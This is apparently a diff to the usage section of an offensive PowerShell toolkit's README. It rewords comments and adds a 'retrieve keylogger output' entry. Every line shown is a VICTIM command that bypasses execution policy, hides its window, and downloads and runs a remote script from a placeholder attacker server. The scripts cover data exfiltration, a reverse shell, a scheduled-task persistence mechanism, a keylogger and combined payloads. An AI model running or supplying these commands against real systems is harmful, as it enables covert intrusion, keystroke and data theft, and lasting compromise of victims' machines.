@@ -11,15 +11,18 @@ ATTACKER> python3 server.py
 #For data exfiltration
 VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/exf");"
 
-#For reverse-shell
+#To get a reverse-shell
 VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/rvs");"
 
-#For running a persistent command (by default runs every hour for 6 days, but can be changed in `client_pers.ps1`)
+#To create a scheduled task (by default runs every hour for 6 days, but can be changed in `client_pers.ps1`)
 VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/pers");"
 
-#For running a keylogger
+#To run a keylogger
 VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/klogger");"
 
-#For running data exfiltration + reverse-shell
+#To retrieve keylogger output
+VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/klogger_exf");"
+
+#To run data exfiltration + reverse-shell
 VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/all");"
 ```
